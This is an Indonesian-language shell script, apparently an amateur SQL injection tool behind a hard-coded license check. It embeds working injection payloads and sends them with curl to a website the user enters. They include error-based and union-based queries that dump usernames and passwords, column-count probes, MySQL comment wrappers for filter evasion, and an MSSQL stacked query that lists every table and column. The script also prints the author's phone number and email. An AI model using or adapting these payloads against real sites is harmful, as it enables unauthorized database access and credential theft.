#!/bin/sh
# Author : D@rk_Devil#730
#variabel Coloumns
kata=$melilih
qas="/*!50000$kata*/"
dump="+and+(select+1+from+(select+count(*),concat((select(select+concat(cast(concat(username,0x7e,password)as+char),0x7e))+from+DATABASENAME.TABLE­NAME+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)"
sal="+and+(select+1+from(select+count(*),concat((select(select+concat(cast(table_name+as+char),0x7e))+from+information_schema.tables+where+table_schema=database()limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)"
jancok="--+"
sd="'"
sma="union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username,password)),@)--+"   
tk="+ORDER+BY $arigato--+"
asiap="+UNION+SELECT $bawang$jancok"
eas="+or+1+group+by+concat_ws(0x3a,version(),floor(rand(0)*2))having+min(0)+or+1--"
qwe=";begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by rummykhan :: '%2b@@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @a=@a %2b column_name%2b' : ' from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%2b@z%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns : '%2b@a%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into Chall1 END--"

#Link
geth=$(curl -s $namasaja$sd)
getd=$(curl -s $namasaja$sd$sma)
getu=$(curl -s $namasaja$sd $asiap)
geto=$(curl -s $namasaja$sd $tk)
gete=$(curl -s $namasaja$sd $eas)
gete1=$(curl -s $namasaja$sd$qwe)
gete2=$(curl -s $namasaja$sd $qwe)
gete3=$(curl -s $namasaja$qwe)
gete4=$(curl -s $namasaja $qwe)
geti=$(curl -s $namasaja$sd $sal)
getq=$(curl -s $namasaja$sd $dump)
#warna
b="\033[1m"
r="\033[1;31m"
k="\033[33;1m"
p="\033[37;1m"
#variabel
log1(){
    clear
    sleep 0.8
    printf "                                              
$r@@@        @@@@@@    @@@@@@@@  @@@  @@@  @@@  
$r@@@       @@@@@@@@  @@@@@@@@@  @@@  @@@@ @@@  
$r@@!       @@!  @@@  !@@        @@!  @@!@!@@@  
$r!@!       !@!  @!@  !@!        !@!  !@!!@!@!  
$r@!!       @!@  !@!  !@! @!@!@  !!@  @!@ !!@!  
!!!       !@!  !!!  !!! !!@!!  !!!  !@!  !!!  
!!:       !!:  !!!  :!!   !!:  !!:  !!:  !!!  
 :!:      :!:  !:!  :!:   !::  :!:  :!:  !:!  
 :: ::::  ::::: ::   ::: ::::   ::   ::   ::  
: :: : :   : :  :    :: :: :   :    ::    :   
                                              
"
    sleep 0.3
    echo "$r[$k+$r]$k User :$p `whoami`$k belum memiliki Lisensi"
    sleep 0.3
    echo "$r[$k+$r]$k Time :$p `date`"
    sleep 0.3
    echo ""
    echo -n "$r[$k?$r]$k No Lisensi : "
    read lisen1
    case $lisen1 in
    445912)sleep 2
    echo "$r[$k√$r]$k Login Sukses"
    sleep 3
    clear
    baner
    sleep 2
    menu
    
    ;;
    
    *)sleep 2
    echo "$r[$r!$r]$r Login gagal"
    sleep 2
    clear
    log1
    
    ;;
    
    esac
}
baner(){
    sleep 2
    clear
    printf "                                   
$r@@@  @@@  @@@   @@@@@@    @@@@@@@  
$r@@@  @@@  @@@  @@@@@@@@  @@@@@@@@  
$r@@!  @@!  !@@  @@!  @@@  !@@       
$r!@!  !@!  @!!  !@!  @!@  !@!       
$r!!@   !@@!@!   @!@!@!@!  !@!       
!!!    @!!!    !!!@!!!!  !!!       
!!:   !: :!!   !!:  !!!  :!!       
:!:  :!:  !:!  :!:  !:!  :!:       
 ::   ::  :::  ::   :::   ::: :::  
:     :   ::    :   : :   :: :: :  
                                   
"
    #printf "`......` oNs/ `:+shmNMMmhso+/:-.` +NMMN` -odNMMMMds:` oMMMMMh- .omMMMMMNo. `dMMMMMMd- .sNMMMMMN+` :NMMMMMMMN- `oNMMMMMMy. dMMMMMMMMMm` .dMMMMMMMo` `NMMMMMMMMMm` -mMMMMMMMs `oMMMMMMMMMMh` .mMMMMMMMd` `./ymMMMMMMMMMMMM: hMMMMMMMM/ `:smNMMMMMMMMMMMMMMN- /MMMMMMMMM. `-+os+smMMMMMMMMMMMMMMMMMMo hMMMMMMMMM` `/hmNMMMMMMMMMMMMMMMMMMMMMMMy` ` NMMMMMMMMM- `hMMMMMMdNMMMMMMMMMNNMMMMMMh:` / MMMMMMMMMMo `hMMMMMMmhMMMMMMMMMN--NMhMMs` y NMMMMMMMMMN. sMMMMMNs:mMMNdymMMm/ `mM+Mo /d yMMMMMMMMMMd` hMMMMN:mNms:.`+NMy- `dMmN. -Ns :MMMMMMMMMMMd.:dMMNs-Mm-`-/smMMNhyyhNMMMd+` :NN. yMMMMMMMMMMMm/.o+:.yMmhmMMMMMMMMMMMMMMMMMy``sNMo `dMMMMMMMMMMMMh:-yNMMMMMMMMMMMMMMMMMMMMMMMdmMMh` .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh` `sMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo` :dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd: +mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd/ :yNMMMMMMMMMMMMMMMMMMMMMMMMMMNs: `:sdMMMMMMMMMMMMMMMMMMMMds: `-/oydmNNNNNNmhyo/-` "
    trap ctrl_c INT
    ctrl_c(){
        clear
        sleep 0.3
        echo "$r[$k+$r]$k CTRL_C : Exit"
        sleep 0.3
        echo "$r[$k+$r]$k Terima kasih >_<"
        sleep 4
        exit
    }
}
menu(){
    sleep 0.3
    echo ""
    echo -n "$r[$k?$r]$k IXC >> "
    read satu
    case $satu in
    help)hel1
    
    ;;
    
    start)sleep 2
    hpro
    
    ;;
    
    chat)gg
    
    ;;
    
    *)menu
    
    ;;
    
    esac
}
opsi(){
    echo ""
    echo -n "$r[$k?$r]$k Pilih Option : "
    read sayang
    case $sayang in
    --h)sleep 3
    target1=$geth CURL_RESPONSE=`curl -s -o /dev/null/ -w "%{http_code}" $target1`
    opsi
    
    ;;
    
    --d)sleep 3
    target2=$getd CURL_RESPONSE1=`curl -s -o /dev/null/ -w "%{http_code}" $target2`
    opsi
    
    ;;
    
    --u)sleep 3
    target3=$getu CURL_RESPONSE2=`curl -s -o /dev/null/ -w "%{http_code}" $target3`
    opsi
    
    ;;
    
    --n)sleep 3
    echo ""
    echo -n "$r[$k?$r]$k Masukkan Teks : "
    read melilih
    sleep 2
    farrel="$melilih"
    janz="/*!13337$farrel*/"
    asd="$melilih"
    lkj="/*!12345$asd*/"
    fas="$melilih"
    kurang1="/*!50000$fas*/"
    echo "$r[$k+$r]$k Hasil :$p $kurang1"
    echo "$r[$k+$r]$k Hasil :$p $lkj"
    echo "$r[$k+$r]$k Hasil :$p $janz"
    opsi
    
    ;;
    
    --o)sleep 3
    target4=$geto CURL_RESPONSE3=`curl -s -o /dev/null -w "%{http_code}" $target4`
    opsi
    
    ;;
    
    --e)sleep 3
    target5=$gete CURL_RESPONSE4=`curl -s -o /dev/null -w "%{http_code}" $target5`
    target6=$gete1 CURL_RESPONSE5=`curl -s -o /dev/null -w "%{http_code}" $target6`
    target7=$gete2 CURL_RESPONSE6=`curl -s -o /dev/null -w "%{http_code}" $target7`
    target8=$gete3 CURL_RESPONSE7=`curl -s -o /dev/null -w "%{http_code}" $target8`
    target9=$gete4 CURL_RESPONSE8=`curl -s -o /dev/null -w "%{http_code}" $target9`
    opsi
    
    ;;
    
    --i)sleep 2
    target10=$geti CURL_RESPONSE9=`curl -s -o /dev/null -w "%{http_code}" $target10`
    
    ;;
    
    --q)sleep 2
    target11=$getq CURL_RESPONSE10=`curl -s -o /dev/null -w "%{http_code}" $target11`
    
    ;;
    
    *)opsi
    
    ;;
    
    esac
}
hpro(){
    sleep 0.3
    echo ""
    echo -n "$r[$k+$r]$k Nama Website : "
    read namasaja
    echo ""
    echo "$r[$k!$r]$k Contoh :$p 10"
    echo -n "$r[$k+$r]$k Masukkan Value : "
    read arigato
    echo ""
    echo "$r[$k+$r]$k Contoh : 1,2,3,4,5,6,7,8,9,10"
    echo "$r[$k+$r]$k Bisa berkurang tergantung Website"
    echo -n "$r[$k?$r]$k Masukkan Union : "
    read bawang
    sleep 3
    opsi
}
hel1(){
    sleep 0.3
    echo ""
    sleep 0.3
    echo "   $k Author :$p D@rk_Devil#666"
    sleep 0.3
    echo "   $k   WA   :$p 089652884613"
    sleep 0.3
    echo "   $k  Email :$p Darkhytd666@gmail.com"
    sleep 0.3
    echo "   $k--h :$p Mengetes website vuln"
    sleep 0.3
    echo "   $k--d :$p Melihat database"
    sleep 0.3
    echo "   $k--u :$p Union Select"
    sleep 0.3
    echo "   $k--n :$p Number Selection"
    sleep 0.3
    echo "   $k--o :$p ORDER BY"
    sleep 0.3
    echo "   $k--e :$p Error Database"
    sleep 0.3
    echo "  $k start   :$p Memulai Tools"
    sleep 0.3
    echo "  $k chat    :$p Mengirim pesan"
    sleep 0.3
    echo "  $k ctrl_c  :$p Exit Tools"
    sleep 0.3
    echo "  $k Version :$p 1.1"
    sleep 0.3
    echo "  $k Contoh  :$p https://namasite"
    sleep 0.3
    echo ""
    lagi
}
lagi(){
    echo -n "$r[$k?$r]$k Ingin mengulang[y/n] : "
    read mencatat
    case $mencatat in
    y)sleep 2
    clear
    baner
    menu
    
    ;;
    
    n)sleep 2
    clear
    exit
    
    ;;
    
    *)lagi
    
    ;;
    
    esac
}
gg(){
    sleep 2
    echo ""
    echo -n "$r[$k?$r]$k Pesan : "
    read mengirim
    xdg-open https://wa.me/send/phone?=6289652884613&text=$mengirim
    sleep 2
    menu
}
#awal
sleep 2
clear
log1